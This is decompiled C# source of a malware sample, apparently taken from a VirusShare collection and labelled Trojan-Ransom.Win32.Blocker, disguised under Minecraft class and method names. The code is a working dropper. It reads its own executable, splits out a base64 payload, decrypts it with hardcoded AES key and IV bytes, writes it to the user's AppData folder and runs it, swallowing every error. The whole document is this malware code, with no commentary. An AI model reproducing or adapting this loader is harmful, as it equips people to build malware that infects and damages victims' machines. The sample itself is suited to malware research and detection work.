// Decompiled with JetBrains decompiler
// Type: Minecraft.Minecraft
// Assembly: Java(TM), Version=10.0.1.0, Culture=neutral, PublicKeyToken=null
// MVID: FA01017C-EB34-4E0A-8D53-AE7B8C3F90BB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00033-msil\Trojan-Ransom.Win32.Blocker.amks-a0c87bd756533c373cdbb92f7492c194e75b434f0df4dfdc58816f15c6807082.exe.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace Minecraft
{
  internal class Minecraft
  {
    private static byte[] Chips;
    private static string[] fileInfo;
    private static string ProgrammaTekst;
    private static string AppDataMap;
    private static string[] MinecraftSpl = new string[1]
    {
      "[yZmOFdG8VWubB3mEX4CMMcKDw]"
    };

    private static void Main(string[] args)
    {
      try
      {
        Minecraft.Minecraft.ProgrammaTekst = Minecraft.Minecraft.Ralt();
        Minecraft.Minecraft.AppDataMap = Minecraft.Minecraft.Zoekmap();
        Minecraft.Minecraft.fileInfo = Minecraft.Minecraft.Minecraften();
        Minecraft.Minecraft.Chips = Minecraft.Minecraft.Minecraftje(Convert.FromBase64String(Minecraft.Minecraft.fileInfo[1]));
        Minecraft.Minecraft.BioWriter();
        Minecraft.Minecraft.StaProDia();
      }
      catch
      {
      }
    }

    private static int BioWriter()
    {
      try
      {
        File.WriteAllBytes(Minecraft.Minecraft.AppDataMap + "\\" + Minecraft.Minecraft.fileInfo[2], Minecraft.Minecraft.Chips);
        return 1;
      }
      catch
      {
        return 0;
      }
    }

    private static string Zoekmap()
    {
      try
      {
        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      }
      catch
      {
        return "";
      }
    }

    private static int StaProDia()
    {
      try
      {
        Process.Start(Minecraft.Minecraft.AppDataMap + "\\" + Minecraft.Minecraft.fileInfo[2]);
        return 1;
      }
      catch
      {
        return 0;
      }
    }

    private static string[] Minecraften()
    {
      try
      {
        return Minecraft.Minecraft.ProgrammaTekst.Split(Minecraft.Minecraft.MinecraftSpl, StringSplitOptions.None);
      }
      catch
      {
        return new string[2]{ "a", "b" };
      }
    }

    private static string Ralt()
    {
      try
      {
        return File.ReadAllText(Process.GetCurrentProcess().MainModule.FileName);
      }
      catch
      {
        return "";
      }
    }

    private static byte[] Minecraftje(byte[] RijnKey)
    {
      try
      {
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        byte[] numArray1 = new byte[16]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 9,
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7
        };
        byte[] numArray2 = new byte[16]
        {
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1,
          (byte) 9,
          (byte) 8,
          (byte) 7,
          (byte) 6,
          (byte) 5,
          (byte) 4,
          (byte) 3,
          (byte) 2,
          (byte) 1
        };
        rijndaelManaged.IV = numArray1;
        rijndaelManaged.Key = numArray2;
        return rijndaelManaged.CreateDecryptor().TransformFinalBlock(RijnKey, 0, RijnKey.Length);
      }
      catch
      {
        return (byte[]) null;
      }
    }
  }
}
